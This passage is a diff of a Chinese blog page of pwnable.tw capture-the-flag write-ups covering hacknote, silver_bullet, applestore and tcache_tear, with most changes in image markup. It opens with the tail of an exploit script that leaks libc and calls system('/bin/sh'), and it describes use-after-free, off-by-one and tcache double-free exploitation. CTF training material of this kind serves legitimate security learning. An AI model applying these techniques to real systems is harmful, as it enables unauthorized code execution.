class="number">4</span>)) ^ <span class="number">0xa</span> ) </span><br><span class="line">libc_base -= libc_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]Get libc_base: '</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get sys_addr and bin_sh_addr</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line">sys_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]Get sys_addr: '</span>+hex(sys_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]Get bin_sh_addr: '</span>+hex(bin_sh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write len</span></span><br><span class="line">ru(<span class="string">'sort :'</span>)</span><br><span class="line">sl(<span class="string">'35'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write padding</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">	write(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write canary</span></span><br><span class="line">write(<span class="string">'+'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write sys_addr</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">	write(str(sys_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write bin_sh_addr</span></span><br><span class="line">write(str(bin_sh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></p>
 <h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
 <p>A good Hacker should always take good notes!<br>nc chall.pwnable.tw 10102</p>
 </blockquote>
 <h2 id="基本信息-5"><a href="#基本信息-5" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接，开了cannary，NX和Partial RELRO，没开PIE</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/hacknote0.jpg" alt="hacknote0"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/hacknote0.jpg" alt="hacknote0" title="">
+                </div>
+                <div class="image-caption">hacknote0</div>
+            </figure></div>
 
 <p>题目是个堆题，有add，delete和print</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/hacknote1.jpg" alt="hacknote1"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/hacknote1.jpg" alt="hacknote1" title="">
+                </div>
+                <div class="image-caption">hacknote1</div>
+            </figure></div>
 
 <p>add可以是任意大小，最多五个chunk</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/hacknote2.jpg" alt="hacknote2"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/hacknote2.jpg" alt="hacknote2" title="">
+                </div>
+                <div class="image-caption">hacknote2</div>
+            </figure></div>
 
 <p>delete中free后没有把指针置空，结合print就是UAF</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/hacknote3.jpg" alt="hacknote3"></div><br><div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/hacknote4.jpg" alt="hacknote4"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/hacknote3.jpg" alt="hacknote3" title="">
+                </div>
+                <div class="image-caption">hacknote3</div>
+            </figure></div><br><div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/hacknote4.jpg" alt="hacknote4" title="">
+                </div>
+                <div class="image-caption">hacknote4</div>
+            </figure></div>
 
 <h2 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h2><p>由于add一次会增加一个0x20和指定大小+0x10的堆块，所以可以申请两个大于0x10的堆块</p>
 <p>然后free掉，再申请个0x10的堆块，造成UAF，申请的时候填入atoi的got表地址，泄露libc</p>
@@ -491,19 +725,49 @@
 <p>Please kill the werewolf with silver bullet!<br>nc chall.pwnable.tw 10103</p>
 </blockquote>
 <h2 id="基本信息-6"><a href="#基本信息-6" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接，开了NX和Full RELRO</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet0.jpg" alt="silver_bullet0"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet0.jpg" alt="silver_bullet0" title="">
+                </div>
+                <div class="image-caption">silver_bullet0</div>
+            </figure></div>
 
 <p>题目是个栈题，三个选项</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet1.jpg" alt="silver_bullet1"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet1.jpg" alt="silver_bullet1" title="">
+                </div>
+                <div class="image-caption">silver_bullet1</div>
+            </figure></div>
 
 <p>选项1是create_bullet，添加不超过0x30的数据，其中数据长度会保存在数据的后面，都在栈上，且后面就是ebp和返回地址</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet2.jpg" alt="silver_bullet2"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet2.jpg" alt="silver_bullet2" title="">
+                </div>
+                <div class="image-caption">silver_bullet2</div>
+            </figure></div>
 
 <p>选项2是power_up，其中的strncat中存在漏洞，因为它会将字符串拼接在源字符串之后，然后再加一个<code>\x00</code>，从而修改了长度，使得我们可以再次调用选项2劫持返回地址</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet4.jpg" alt="silver_bullet3"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet4.jpg" alt="silver_bullet3" title="">
+                </div>
+                <div class="image-caption">silver_bullet3</div>
+            </figure></div>
 
 <p>选项3是beat，也就是当数据长度大于一定值的时候，程序便会退出</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet5.jpg" alt="silver_bullet4"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet5.jpg" alt="silver_bullet4" title="">
+                </div>
+                <div class="image-caption">silver_bullet4</div>
+            </figure></div>
 
 <h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先create长度位0x2f的数据，然后power_up一个字节，这样下一次便可以覆盖返回地址</p>
 <p>先将返回地址改为puts的plt表，传入参数puts的got表的地址便可泄露libc</p>
@@ -513,31 +777,91 @@
 <p>tomcr00se rooted the galaxy S5, but we need you to jailbreak the iPhone8!<br>nc chall.pwnable.tw 10104</p>
 </blockquote>
 <h2 id="基本信息-7"><a href="#基本信息-7" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接，开了Canary，NX和Partial RELRO</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/applestore0.jpg" alt="applestore0"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore0.jpg" alt="applestore0" title="">
+                </div>
+                <div class="image-caption">applestore0</div>
+            </figure></div>
 
 <p>题目看似是个堆题，实际上是个栈题</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/applestore1.jpg" alt="applestore1"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore1.jpg" alt="applestore1" title="">
+                </div>
+                <div class="image-caption">applestore1</div>
+            </figure></div>
 
 <p>选项1是list，可以列出当前store的商品</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/applestore2.jpg" alt="applestore2"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore2.jpg" alt="applestore2" title="">
+                </div>
+                <div class="image-caption">applestore2</div>
+            </figure></div>
 
 <p>选项2是add，可以添加商品到myCart中，其中myCart是一个双向列表，连接着各个商品</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/applestore3.jpg" alt="applestore3"></div><br><div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/applestore4.jpg" alt="applestore4"></div><br><div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/applestore5.jpg" alt="applestore5"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore3.jpg" alt="applestore3" title="">
+                </div>
+                <div class="image-caption">applestore3</div>
+            </figure></div><br><div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore4.jpg" alt="applestore4" title="">
+                </div>
+                <div class="image-caption">applestore4</div>
+            </figure></div><br><div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore5.jpg" alt="applestore5" title="">
+                </div>
+                <div class="image-caption">applestore5</div>
+            </figure></div>
 
 <p>选项3是delete，将指定的商品从myCart中拿去，类似于unlink</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/applestore6.jpg" alt="applestore6"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore6.jpg" alt="applestore6" title="">
+                </div>
+                <div class="image-caption">applestore6</div>
+            </figure></div>
 
 <p>选项4是cart，可以遍历myCart链表并打印出各个商品的价格</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/applestore7.jpg" alt="applestore7"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore7.jpg" alt="applestore7" title="">
+                </div>
+                <div class="image-caption">applestore7</div>
+            </figure></div>
 
 <p>选项5是checkout，当商品总价为<code>0x1C06</code>时，在myCart末端添加一个iPhone 8，该结构体位于栈上</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/applestore8.jpg" alt="applestore8"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore8.jpg" alt="applestore8" title="">
+                </div>
+                <div class="image-caption">applestore8</div>
+            </figure></div>
 
 <p>结构体如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Phone</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> price;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Phone</span> *<span class="title">fd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Phone</span> *<span class="title">bk</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h2><p>该题有几个知识点：</p>
 <p>1.atoi只会转换数字，但是如果你输入别的东西，也会把这些东西放在栈上，且<code>\x00</code>也是可以放上去的</p>
 <p>2.libc中有一个东西叫<code>environ</code>，是栈上的一个地址，debug出来是一开始的ebp</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/applestore9.jpg" alt="applestore9"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore9.jpg" alt="applestore9" title="">
+                </div>
+                <div class="image-caption">applestore9</div>
+            </figure></div>
 
 <p>3.栈劫持可以控制程序流</p>
 <p>解题思路如下：</p>
@@ -550,22 +874,64 @@
 <p>Make tcache great again !<br>nc chall.pwnable.tw 10207</p>
 </blockquote>
 <h2 id="基本信息-8"><a href="#基本信息-8" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接，除了PIE全开，libc2.27</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear0.jpg" alt="tcache_tear0"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear0.jpg" alt="tcache_tear0" title="">
+                </div>
+                <div class="image-caption">tcache_tear0</div>
+            </figure></div>
 
 <p>题目是个堆题，有add，free和show</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear1.jpg" alt="tcache_tear1"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear1.jpg" alt="tcache_tear1" title="">
+                </div>
+                <div class="image-caption">tcache_tear1</div>
+            </figure></div>
 
 <p>选项1是add，可以add任意个size小于0xff的chunk，且读入的数据是<code>size-0x10</code>，该参数在my_read中是无符号的，意味着我们如果输入的size小于0x10，则可以输入远大于size的数据，造成堆溢出</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear2.jpg" alt="tcache_tear2"></div><br><div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear6.jpg" alt="tcache_tear6"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear2.jpg" alt="tcache_tear2" title="">
+                </div>
+                <div class="image-caption">tcache_tear2</div>
+            </figure></div><br><div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear6.jpg" alt="tcache_tear6" title="">
+                </div>
+                <div class="image-caption">tcache_tear6</div>
+            </figure></div>
 
 <p>选项2是delete，删除ptr指针所指向的chunk且未置空</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear3.jpg" alt="tcache_tear3"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear3.jpg" alt="tcache_tear3" title="">
+                </div>
+                <div class="image-caption">tcache_tear3</div>
+            </figure></div>
 
 <p>选项3是show，将bss段上的name区域的东西打印出来</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear4.jpg" alt="tcache_tear4"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear4.jpg" alt="tcache_tear4" title="">
+                </div>
+                <div class="image-caption">tcache_tear4</div>
+            </figure></div>
 
 <p>可以看到bss段上name和ptr挨在一起</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear5.jpg" alt="tcache_tear5"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear5.jpg" alt="tcache_tear5" title="">
+                </div>
+                <div class="image-caption">tcache_tear5</div>
+            </figure></div>
 
 <h2 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h2><p>1.tcache的double free任意写到bss段上<code>name-0x10+0x600</code>处，构造伪造的chunk</p>
 <p>2.再double free一次任意写到<code>name-0x10</code>处伪造<code>0x600</code>的chunk，并且修改<code>ptr</code>，使得下次free可以free到我们伪造在name的chunk</p>
@@ -578,7 +944,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2020-01-21T06:25:40.157Z" itemprop="dateUpdated">2020-01-21 14:25:40</time>
+    最后更新时间：<time datetime="2020-01-21T06:25:40.157Z" itemprop="dateUpdated">2020-01-21 14:25:40</time>
 </span><br>
 
 
@@ -674,7 +1040,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
         </p>
     </div>
     <div class="bottom">
